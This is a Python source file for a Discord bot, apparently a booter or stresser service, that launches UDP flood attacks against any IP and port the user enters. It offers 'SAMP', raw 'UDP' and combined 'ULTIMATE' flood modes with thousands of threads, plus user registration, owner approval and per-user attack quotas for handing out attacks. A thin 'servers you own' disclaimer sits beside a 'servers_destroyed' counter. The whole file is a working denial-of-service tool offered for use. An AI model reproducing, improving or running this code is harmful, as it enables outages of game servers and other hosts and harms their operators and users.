#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ⚡ DEVELOPED BY LI ZANDYA - ULTIMATE C2 NUCLEAR SYSTEM ⚡
# 🔥 FULL BUTTONS SYSTEM - NO COMMANDS 🔥
# ⚠️ USE ONLY ON SERVERS YOU OWN! ⚠️

import discord
from discord.ext import commands
from discord.ui import Button, View, Modal, TextInput
import asyncio
import random
import socket
import struct
import time
import os
import json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# ============================================
# تحميل البيانات
# ============================================
DATA_FILE = "c2_data.json"

def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            return json.load(f)
    return {"owner_id": None, "users": {}, "pending_users": []}

def save_data():
    with open(DATA_FILE, 'w') as f:
        json.dump({
            "owner_id": OWNER_ID,
            "users": USERS,
            "pending_users": PENDING_USERS
        }, f, indent=4)

data = load_data()
OWNER_ID = data.get("owner_id")
USERS = data.get("users", {})
PENDING_USERS = data.get("pending_users", [])

# ============================================
# إعدادات القوة
# ============================================
CPU_CORES = os.cpu_count() or 4
MAX_THREADS_USER = 60
MAX_THREADS_OWNER = 100000

try:
    import psutil
    TOTAL_RAM = psutil.virtual_memory().total // (1024**3)
except:
    TOTAL_RAM = 4

# ============================================
# بيانات تسجيل الدخول
# ============================================
REQUIRED_IP = "187.121.21.12"
REQUIRED_USERNAME = "LI ZANDYA"
REQUIRED_PASSWORD = "C2_NUCLEAR_2024"

# ============================================
# نظام الهجوم
# ============================================
class NuclearTester:
    def __init__(self):
        self.running = False
        self.authenticated = False
        self.authenticated_user = None
        self.stats = {
            'total_packets': 0, 'total_bytes': 0, 'total_attacks': 0,
            'active_attacks': 0, 'start_time': None, 'servers_destroyed': 0,
            'peak_speed_pps': 0
        }
        self.executor = ThreadPoolExecutor(max_workers=MAX_THREADS_OWNER)
    
    def check_auth(self, ip, username, password):
        if ip == REQUIRED_IP and username.upper() == REQUIRED_USERNAME and password == REQUIRED_PASSWORD:
            self.authenticated = True
            self.authenticated_user = username
            return True
        return False
    
    async def attack(self, ip, port, duration, threads, is_samp=True):
        self.running = True
        if not self.stats['start_time']:
            self.stats['start_time'] = time.time()
        self.stats['active_attacks'] += 1
        sent = 0
        
        def worker():
            nonlocal sent
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                start = time.time()
                while self.running and time.time() - start < duration:
                    if is_samp:
                        packet = b'SAMP'
                        packet += struct.pack('<I', random.randint(1, 99999))
                        packet += b'\x80'
                        packet += struct.pack('<fffff', random.uniform(-3000,3000), random.uniform(-3000,3000), random.uniform(-3000,3000), random.uniform(0,360), random.uniform(0,360))
                        packet += struct.pack('<I', random.randint(1,46))
                        packet += struct.pack('<I', 99999)
                        packet += os.urandom(500)
                    else:
                        packet = os.urandom(random.randint(512, 4096))
                    sock.sendto(packet, (ip, port))
                    sent += 1
                sock.close()
            except:
                pass
        
        workers = min(threads, 500)
        futures = [self.executor.submit(worker) for _ in range(workers)]
        await asyncio.sleep(duration)
        self.running = False
        
        self.stats['total_packets'] += sent
        self.stats['active_attacks'] -= 1
        self.stats['total_attacks'] += 1
        
        rate = sent / duration
        if rate > self.stats['peak_speed_pps']:
            self.stats['peak_speed_pps'] = rate
        
        return sent, rate
    
    def stop(self):
        self.running = False
        return True

tester = NuclearTester()

# ============================================
# أزرار المالك للموافقة على المستخدمين
# ============================================
class OwnerApproveView(View):
    def __init__(self, user_id, user_name):
        super().__init__(timeout=86400)
        self.user_id = user_id
        self.user_name = user_name
    
    @discord.ui.button(label="✅ APPROVE", style=discord.ButtonStyle.success, emoji="✅")
    async def approve(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != OWNER_ID:
            await interaction.response.send_message("❌ Only owner can approve!", ephemeral=True)
            return
        
        USERS[self.user_id] = {"attacks_left": 1, "role": "user"}
        if self.user_id in PENDING_USERS:
            PENDING_USERS.remove(self.user_id)
        save_data()
        
        try:
            user = await interaction.client.fetch_user(int(self.user_id))
            if user:
                embed = discord.Embed(title="✅ REGISTRATION APPROVED!", color=0x00FF00)
                embed.add_field(name="Welcome", value="You have **1 free attack**!", inline=False)
                embed.add_field(name="Next Steps", value="Click the button below to login", inline=False)
                view = LoginView()
                await user.send(embed=embed, view=view)
        except:
            pass
        
        await interaction.response.send_message(f"✅ Approved {self.user_name}!", ephemeral=True)
        await interaction.message.delete()
    
    @discord.ui.button(label="❌ DENY", style=discord.ButtonStyle.danger, emoji="❌")
    async def deny(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != OWNER_ID:
            await interaction.response.send_message("❌ Only owner can deny!", ephemeral=True)
            return
        
        if self.user_id in PENDING_USERS:
            PENDING_USERS.remove(self.user_id)
            save_data()
        
        await interaction.response.send_message(f"❌ Denied {self.user_name}!", ephemeral=True)
        await interaction.message.delete()
    
    @discord.ui.button(label="⚙️ SET LIMIT", style=discord.ButtonStyle.secondary, emoji="⚙️")
    async def set_limit(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != OWNER_ID:
            await interaction.response.send_message("❌ Only owner!", ephemeral=True)
            return
        
        modal = Modal(title="⚙️ SET ATTACK LIMIT")
        limit_input = TextInput(label="Number of attacks", placeholder="Enter number (e.g., 5, 10, 100)", required=True)
        modal.add_item(limit_input)
        
        async def on_submit(interaction):
            try:
                limit = int(limit_input.value)
                USERS[self.user_id] = {"attacks_left": limit, "role": "user"}
                save_data()
                await interaction.response.send_message(f"✅ Set limit to {limit} attacks for {self.user_name}!", ephemeral=True)
                
                try:
                    user = await interaction.client.fetch_user(int(self.user_id))
                    if user:
                        await user.send(f"⚙️ Admin set your attack limit to **{limit}** attacks!")
                except:
                    pass
            except:
                await interaction.response.send_message("❌ Invalid number!", ephemeral=True)
        
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)

# ============================================
# أزرار تسجيل الدخول
# ============================================
class LoginModal(Modal):
    def __init__(self):
        super().__init__(title="🔐 C2 SYSTEM LOGIN")
        self.ip = TextInput(label="🌐 C2 IP", placeholder=REQUIRED_IP, required=True, default=REQUIRED_IP)
        self.user = TextInput(label="👤 Username", placeholder=REQUIRED_USERNAME, required=True, default=REQUIRED_USERNAME)
        self.pwd = TextInput(label="🔑 Password", placeholder=REQUIRED_PASSWORD, required=True, default=REQUIRED_PASSWORD)
        self.add_item(self.ip)
        self.add_item(self.user)
        self.add_item(self.pwd)
    
    async def on_submit(self, interaction: discord.Interaction):
        if tester.check_auth(self.ip.value, self.user.value, self.pwd.value):
            tester.authenticated = True
            tester.authenticated_user = self.user.value
            await interaction.response.send_message(f"✅ **LOGIN SUCCESSFUL!**\n👑 Welcome {self.user.value}", ephemeral=True)
            
            # إرسال لوحة التحكم للمستخدم
            if str(interaction.user.id) == OWNER_ID:
                await interaction.user.send("👑 **OWNER PANEL**", view=OwnerPanel(interaction.user.id))
            else:
                await interaction.user.send("💀 **ATTACK PANEL**", view=AttackPanel(interaction.user.id))
        else:
            await interaction.response.send_message("❌ **LOGIN FAILED!** Invalid credentials.", ephemeral=True)

class LoginView(View):
    def __init__(self):
        super().__init__(timeout=60)
    
    @discord.ui.button(label="🔐 LOGIN TO C2 SYSTEM", style=discord.ButtonStyle.danger, emoji="🔐")
    async def login(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(LoginModal())

# ============================================
# أزرار التسجيل
# ============================================
class RegisterModal(Modal):
    def __init__(self):
        super().__init__(title="📝 REGISTER TO C2 SYSTEM")
        self.username = TextInput(label="👤 Username", placeholder="Enter your username", required=True)
        self.reason = TextInput(label="📝 Reason", placeholder="Why do you need access?", required=True, style=discord.TextStyle.paragraph)
        self.add_item(self.username)
        self.add_item(self.reason)
    
    async def on_submit(self, interaction: discord.Interaction):
        user_id = str(interaction.user.id)
        
        if user_id in USERS:
            await interaction.response.send_message("✅ You are already registered!", ephemeral=True)
            return
        
        if user_id in PENDING_USERS:
            await interaction.response.send_message("⏳ You already have a pending request!", ephemeral=True)
            return
        
        PENDING_USERS.append(user_id)
        save_data()
        
        # إرسال طلب للمالك
        if OWNER_ID:
            try:
                owner = await interaction.client.fetch_user(int(OWNER_ID))
                if owner:
                    embed = discord.Embed(title="🔔 NEW REGISTRATION REQUEST", color=0xFF6600)
                    embed.add_field(name="User", value=f"{interaction.user.name} (`{user_id}`)", inline=True)
                    embed.add_field(name="Username", value=self.username.value, inline=True)
                    embed.add_field(name="Reason", value=self.reason.value, inline=False)
                    await owner.send(embed=embed, view=OwnerApproveView(user_id, interaction.user.name))
            except:
                pass
        
        await interaction.response.send_message("✅ Registration request sent! Waiting for admin approval.", ephemeral=True)

class RegisterView(View):
    def __init__(self):
        super().__init__(timeout=60)
    
    @discord.ui.button(label="📝 REGISTER NOW", style=discord.ButtonStyle.primary, emoji="📝")
    async def register(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(RegisterModal())

# ============================================
# لوحة الهجوم للمستخدمين العاديين
# ============================================
class AttackModal(Modal):
    def __init__(self, attack_type, user_id):
        super().__init__(title=f"💀 {attack_type} ATTACK")
        self.attack_type = attack_type
        self.user_id = user_id
        self.ip = TextInput(label="🎯 Target IP", placeholder="Your server IP", required=True)
        self.port = TextInput(label="🔌 Port", placeholder="7777", required=True)
        self.duration = TextInput(label="⏱️ Duration (seconds)", placeholder="10-30", required=True)
        self.add_item(self.ip)
        self.add_item(self.port)
        self.add_item(self.duration)
    
    async def on_submit(self, interaction: discord.Interaction):
        if str(interaction.user.id) != self.user_id:
            await interaction.response.send_message("❌ Unauthorized!", ephemeral=True)
            return
        
        # التحقق من وجود هجمات متبقية
        if self.user_id in USERS and USERS[self.user_id].get("attacks_left", 0) <= 0:
            await interaction.response.send_message("❌ **NO ATTACKS LEFT!**\nContact admin for more.", ephemeral=True)
            return
        
        try:
            ip = self.ip.value
            port = int(self.port.value)
            duration = min(int(self.duration.value), 30)
            threads = MAX_THREADS_USER
        except:
            await interaction.response.send_message("❌ Invalid input!", ephemeral=True)
            return
        
        # استهلاك هجمة
        if self.user_id in USERS:
            USERS[self.user_id]["attacks_left"] -= 1
            save_data()
        
        await interaction.response.send_message(f"💀 **ATTACKING {ip}:{port}**\n⚡ Threads: {threads}\n⏱️ Duration: {duration}s", ephemeral=True)
        
        msg = await interaction.followup.send(f"🚀 Launching {self.attack_type} attack...", ephemeral=True)
        
        if self.attack_type == "SAMP":
            packets, rate = await tester.attack(ip, port, duration, threads, is_samp=True)
        elif self.attack_type == "UDP":
            packets, rate = await tester.attack(ip, port, duration, threads, is_samp=False)
        else:
            # Ultimate = SAMP + UDP
            packets1, rate1 = await tester.attack(ip, port, duration, threads, is_samp=True)
            packets2, rate2 = await tester.attack(ip, port, duration, threads, is_samp=False)
            packets = packets1 + packets2
            rate = rate1 + rate2
        
        remaining = USERS.get(self.user_id, {}).get("attacks_left", 0)
        await msg.edit(content=f"✅ **ATTACK COMPLETE!**\n📦 Packets: {packets:,}\n⚡ Rate: {rate:,.0f} pps\n💀 Attacks left: {remaining}")

class AttackPanel(View):
    def __init__(self, user_id):
        super().__init__(timeout=None)
        self.user_id = user_id
    
    @discord.ui.button(label="🎮 SAMP ATTACK", style=discord.ButtonStyle.danger, row=0, emoji="🎮")
    async def samp_btn(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != self.user_id:
            await interaction.response.send_message("❌ Unauthorized!", ephemeral=True)
            return
        await interaction.response.send_modal(AttackModal("SAMP", self.user_id))
    
    @discord.ui.button(label="📡 UDP ATTACK", style=discord.ButtonStyle.primary, row=0, emoji="📡")
    async def udp_btn(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != self.user_id:
            await interaction.response.send_message("❌ Unauthorized!", ephemeral=True)
            return
        await interaction.response.send_modal(AttackModal("UDP", self.user_id))
    
    @discord.ui.button(label="💀 ULTIMATE ATTACK", style=discord.ButtonStyle.danger, row=1, emoji="💀")
    async def ultimate_btn(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != self.user_id:
            await interaction.response.send_message("❌ Unauthorized!", ephemeral=True)
            return
        await interaction.response.send_modal(AttackModal("ULTIMATE", self.user_id))
    
    @discord.ui.button(label="📊 MY STATS", style=discord.ButtonStyle.secondary, row=2, emoji="📊")
    async def stats_btn(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != self.user_id:
            await interaction.response.send_message("❌ Unauthorized!", ephemeral=True)
            return
        
        attacks_left = USERS.get(self.user_id, {}).get("attacks_left", 0)
        embed = discord.Embed(title="📊 YOUR STATISTICS", color=0xFFD700)
        embed.add_field(name="💀 Attacks Left", value=str(attacks_left), inline=True)
        embed.add_field(name="🎯 Total Attacks", value=str(tester.stats['total_attacks']), inline=True)
        embed.add_field(name="🏆 Peak PPS", value=f"{tester.stats['peak_speed_pps']:,.0f}", inline=True)
        embed.add_field(name="⚡ Thread Limit", value=f"{MAX_THREADS_USER} threads", inline=True)
        await interaction.response.send_message(embed=embed, ephemeral=True)
    
    @discord.ui.button(label="👤 PROFILE", style=discord.ButtonStyle.secondary, row=2, emoji="👤")
    async def profile_btn(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != self.user_id:
            await interaction.response.send_message("❌ Unauthorized!", ephemeral=True)
            return
        
        attacks_left = USERS.get(self.user_id, {}).get("attacks_left", 0)
        embed = discord.Embed(title=f"👤 {interaction.user.name}'s PROFILE", color=0x00FF00)
        embed.set_thumbnail(url=interaction.user.avatar.url if interaction.user.avatar else None)
        embed.add_field(name="🆔 ID", value=f"`{self.user_id}`", inline=True)
        embed.add_field(name="💀 Attacks Left", value=f"`{attacks_left}`", inline=True)
        embed.add_field(name="👑 Role", value="`User`", inline=True)
        await interaction.response.send_message(embed=embed, ephemeral=True)
    
    @discord.ui.button(label="⏹️ STOP ATTACK", style=discord.ButtonStyle.danger, row=2, emoji="⏹️")
    async def stop_btn(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != self.user_id:
            await interaction.response.send_message("❌ Unauthorized!", ephemeral=True)
            return
        tester.stop()
        await interaction.response.send_message("⏹️ **ALL ATTACKS STOPPED!**", ephemeral=True)

# ============================================
# لوحة المالك
# ============================================
class OwnerPanel(View):
    def __init__(self, user_id):
        super().__init__(timeout=None)
        self.user_id = user_id
    
    @discord.ui.button(label="🎮 SAMP (UNLIMITED)", style=discord.ButtonStyle.danger, row=0, emoji="🎮")
    async def samp_btn(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != self.user_id:
            await interaction.response.send_message("❌ Unauthorized!", ephemeral=True)
            return
        modal = Modal(title="💀 OWNER SAMP ATTACK")
        ip = TextInput(label="🎯 Target IP", placeholder="Your server IP", required=True)
        port = TextInput(label="🔌 Port", placeholder="7777", required=True)
        duration = TextInput(label="⏱️ Duration (seconds)", placeholder="10-60", required=True)
        threads = TextInput(label="⚡ Threads", placeholder="1000-100000", required=True, default="50000")
        modal.add_item(ip); modal.add_item(port); modal.add_item(duration); modal.add_item(threads)
        
        async def on_submit(interaction):
            try:
                ip_val = ip.value
                port_val = int(port.value)
                duration_val = min(int(duration.value), 60)
                threads_val = min(int(threads.value), MAX_THREADS_OWNER)
            except:
                await interaction.response.send_message("❌ Invalid input!", ephemeral=True)
                return
            
            await interaction.response.send_message(f"💀 **OWNER ATTACK**\n🎯 {ip_val}:{port_val}\n⚡ Threads: {threads_val}\n⏱️ Duration: {duration_val}s", ephemeral=True)
            msg = await interaction.followup.send("🚀 Launching attack...", ephemeral=True)
            packets, rate = await tester.attack(ip_val, port_val, duration_val, threads_val, is_samp=True)
            await msg.edit(content=f"✅ **ATTACK COMPLETE!**\n📦 Packets: {packets:,}\n⚡ Rate: {rate:,.0f} pps")
        
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)
    
    @discord.ui.button(label="📡 UDP (UNLIMITED)", style=discord.ButtonStyle.primary, row=0, emoji="📡")
    async def udp_btn(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != self.user_id:
            await interaction.response.send_message("❌ Unauthorized!", ephemeral=True)
            return
        modal = Modal(title="💀 OWNER UDP ATTACK")
        ip = TextInput(label="🎯 Target IP", placeholder="Your server IP", required=True)
        port = TextInput(label="🔌 Port", placeholder="7777", required=True)
        duration = TextInput(label="⏱️ Duration (seconds)", placeholder="10-60", required=True)
        threads = TextInput(label="⚡ Threads", placeholder="1000-100000", required=True, default="50000")
        modal.add_item(ip); modal.add_item(port); modal.add_item(duration); modal.add_item(threads)
        
        async def on_submit(interaction):
            try:
                ip_val = ip.value
                port_val = int(port.value)
                duration_val = min(int(duration.value), 60)
                threads_val = min(int(threads.value), MAX_THREADS_OWNER)
            except:
                await interaction.response.send_message("❌ Invalid input!", ephemeral=True)
                return
            
            await interaction.response.send_message(f"🔥 **OWNER UDP ATTACK**\n🎯 {ip_val}:{port_val}\n⚡ Threads: {threads_val}\n⏱️ Duration: {duration_val}s", ephemeral=True)
            msg = await interaction.followup.send("🚀 Launching attack...", ephemeral=True)
            packets, rate = await tester.attack(ip_val, port_val, duration_val, threads_val, is_samp=False)
            await msg.edit(content=f"✅ **ATTACK COMPLETE!**\n📦 Packets: {packets:,}\n⚡ Rate: {rate:,.0f} pps")
        
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)
    
    @discord.ui.button(label="💀 ULTIMATE (UNLIMITED)", style=discord.ButtonStyle.danger, row=1, emoji="💀")
    async def ultimate_btn(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != self.user_id:
            await interaction.response.send_message("❌ Unauthorized!", ephemeral=True)
            return
        modal = Modal(title="💀 OWNER ULTIMATE ATTACK")
        ip = TextInput(label="🎯 Target IP", placeholder="Your server IP", required=True)
        port = TextInput(label="🔌 Port", placeholder="7777", required=True)
        duration = TextInput(label="⏱️ Duration (seconds)", placeholder="10-60", required=True)
        threads = TextInput(label="⚡ Threads", placeholder="1000-100000", required=True, default="50000")
        modal.add_item(ip); modal.add_item(port); modal.add_item(duration); modal.add_item(threads)
        
        async def on_submit(interaction):
            try:
                ip_val = ip.value
                port_val = int(port.value)
                duration_val = min(int(duration.value), 60)
                threads_val = min(int(threads.value), MAX_THREADS_OWNER)
            except:
                await interaction.response.send_message("❌ Invalid input!", ephemeral=True)
                return
            
            await interaction.response.send_message(f"💀 **OWNER ULTIMATE ATTACK**\n🎯 {ip_val}:{port_val}\n⚡ Threads: {threads_val}\n⏱️ Duration: {duration_val}s", ephemeral=True)
            msg = await interaction.followup.send("🚀 Launching ultimate attack...", ephemeral=True)
            packets1, rate1 = await tester.attack(ip_val, port_val, duration_val, threads_val, is_samp=True)
            packets2, rate2 = await tester.attack(ip_val, port_val, duration_val, threads_val, is_samp=False)
            packets = packets1 + packets2
            rate = rate1 + rate2
            await msg.edit(content=f"✅ **ULTIMATE COMPLETE!**\n📦 Packets: {packets:,}\n⚡ Rate: {rate:,.0f} pps")
        
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)
    
    @discord.ui.button(label="📋 PENDING REQUESTS", style=discord.ButtonStyle.secondary, row=2, emoji="📋")
    async def pending_btn(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != self.user_id:
            await interaction.response.send_message("❌ Unauthorized!", ephemeral=True)
            return
        
        if not PENDING_USERS:
            await interaction.response.send_message("📭 No pending requests!", ephemeral=True)
            return
        
        for uid in PENDING_USERS:
            try:
                user = await interaction.client.fetch_user(int(uid))
                embed = discord.Embed(title="📋 PENDING REQUEST", color=0xFF6600)
                embed.add_field(name="User", value=f"{user.name} (`{uid}`)", inline=True)
                await interaction.response.send(embed=embed, view=OwnerApproveView(uid, user.name), ephemeral=True)
                await asyncio.sleep(0.5)
            except:
                pass
    
    @discord.ui.button(label="👥 ALL USERS", style=discord.ButtonStyle.secondary, row=2, emoji="👥")
    async def users_btn(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != self.user_id:
            await interaction.response.send_message("❌ Unauthorized!", ephemeral=True)
            return
        
        if not USERS:
            await interaction.response.send_message("👥 No users yet!", ephemeral=True)
            return
        
        users_list = ""
        for uid, info in USERS.items():
            attacks = "∞" if info.get("role") == "owner" else info.get("attacks_left", 0)
            users_list += f"• `{uid}` - {attacks} attacks\n"
        
        embed = discord.Embed(title="👥 REGISTERED USERS", description=users_list, color=0x00BFFF)
        await interaction.response.send_message(embed=embed, ephemeral=True)
    
    @discord.ui.button(label="📊 STATS", style=discord.ButtonStyle.secondary, row=2, emoji="📊")
    async def stats_btn(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != self.user_id:
            await interaction.response.send_message("❌ Unauthorized!", ephemeral=True)
            return
        
        embed = discord.Embed(title="📊 SYSTEM STATISTICS", color=0xFFD700)
        embed.add_field(name="📦 Total Packets", value=f"{tester.stats['total_packets']:,}", inline=True)
        embed.add_field(name="🎯 Total Attacks", value=str(tester.stats['total_attacks']), inline=True)
        embed.add_field(name="🏆 Peak PPS", value=f"{tester.stats['peak_speed_pps']:,.0f}", inline=True)
        embed.add_field(name="👥 Registered Users", value=str(len(USERS)), inline=True)
        embed.add_field(name="📝 Pending Users", value=str(len(PENDING_USERS)), inline=True)
        embed.add_field(name="⚡ Max Threads", value=f"{MAX_THREADS_OWNER:,}", inline=True)
        await interaction.response.send_message(embed=embed, ephemeral=True)
    
    @discord.ui.button(label="⚙️ GIVE ATTACKS", style=discord.ButtonStyle.secondary, row=3, emoji="⚙️")
    async def give_btn(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != self.user_id:
            await interaction.response.send_message("❌ Unauthorized!", ephemeral=True)
            return
        
        modal = Modal(title="⚙️ GIVE ATTACKS TO USER")
        user_id_input = TextInput(label="🆓 User ID", placeholder="Enter user ID", required=True)
        amount_input = TextInput(label="🎯 Number of attacks", placeholder="Enter number", required=True)
        modal.add_item(user_id_input)
        modal.add_item(amount_input)
        
        async def on_submit(interaction):
            try:
                target_id = user_id_input.value
                amount = int(amount_input.value)
                
                if target_id not in USERS:
                    USERS[target_id] = {"attacks_left": amount, "role": "user"}
                else:
                    USERS[target_id]["attacks_left"] = USERS[target_id].get("attacks_left", 0) + amount
                save_data()
                
                await interaction.response.send_message(f"✅ Added {amount} attacks to `{target_id}`!", ephemeral=True)
                
                try:
                    user = await interaction.client.fetch_user(int(target_id))
                    if user:
                        await user.send(f"🎁 Admin gave you **{amount}** additional attacks!")
                except:
                    pass
            except:
                await interaction.response.send_message("❌ Invalid input!", ephemeral=True)
        
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)
    
    @discord.ui.button(label="⏹️ STOP", style=discord.ButtonStyle.danger, row=3, emoji="⏹️")
    async def stop_btn(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != self.user_id:
            await interaction.response.send_message("❌ Unauthorized!", ephemeral=True)
            return
        tester.stop()
        await interaction.response.send_message("⏹️ **ALL ATTACKS STOPPED!**", ephemeral=True)

# ============================================
# البوت - بدون أي أوامر
# ============================================
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

# إخفاء الأوامر الافتراضية
bot.remove_command('help')

@bot.event
async def on_ready():
    print(f"""
╔══════════════════════════════════════════════════════════════╗
║         LI ZANDYA C2 SYSTEM ONLINE!                         ║
╠══════════════════════════════════════════════════════════════╣
║ 🤖 Bot: {bot.user}                                           ║
║ 💾 RAM: {TOTAL_RAM} GB                                       ║
║ 👑 Owner: {OWNER_ID if OWNER_ID else 'Not set'}             ║
║ 👥 Users: {len(USERS)}                                      ║
║ 📝 Pending: {len(PENDING_USERS)}                            ║
╠══════════════════════════════════════════════════════════════╣
║ 💀 First person to DM this bot becomes OWNER!               ║
║ 🔥 ALL CONTROLS WITH BUTTONS - NO COMMANDS                  ║
╚══════════════════════════════════════════════════════════════╝
    """)

@bot.event
async def on_message(message):
    global OWNER_ID
    
    if message.author.bot:
        return
    
    # أول شخص يرسل DM يصبح مالك
    if isinstance(message.channel, discord.DMChannel) and not OWNER_ID:
        OWNER_ID = str(message.author.id)
        USERS[OWNER_ID] = {"attacks_left": -1, "role": "owner"}
        save_data()
        
        embed = discord.Embed(title="👑 **YOU ARE NOW THE OWNER!**", color=0x00FF00)
        embed.add_field(name="Welcome", value="You have unlimited attacks!", inline=False)
        await message.channel.send(embed=embed, view=OwnerPanel(OWNER_ID))
        print(f"✅ Owner set: {message.author.name}")
        return
    
    # للرسائل الخاصة - عرض أزرار التسجيل والدخول
    if isinstance(message.channel, discord.DMChannel):
        if str(message.author.id) == OWNER_ID:
            # المالك يظهر له لوحة المالك
            await message.channel.send("👑 **OWNER CONTROL PANEL**", view=OwnerPanel(OWNER_ID))
        elif str(message.author.id) in USERS:
            # المستخدم المسجل يظهر له لوحة الهجوم
            await message.channel.send("💀 **ATTACK PANEL**", view=AttackPanel(str(message.author.id)))
        else:
            # مستخدم جديد - عرض أزرار التسجيل والدخول
            view = View()
            view.add_item(RegisterView().children[0])
            view.add_item(LoginView().children[0])
            await message.channel.send("🔐 **WELCOME TO C2 SYSTEM**\nChoose an option:", view=view)

if __name__ == "__main__":
    TOKEN = input("🔑 Enter your Discord Bot Token: ").strip()
    if not TOKEN:
        print("❌ No token!")
        exit(1)
    
    print("🚀 Starting LI ZANDYA C2 SYSTEM...")
    print("💀 First person to DM becomes OWNER")
    print("🔥 ALL CONTROLS WITH BUTTONS - NO COMMANDS")
    bot.run(TOKEN)
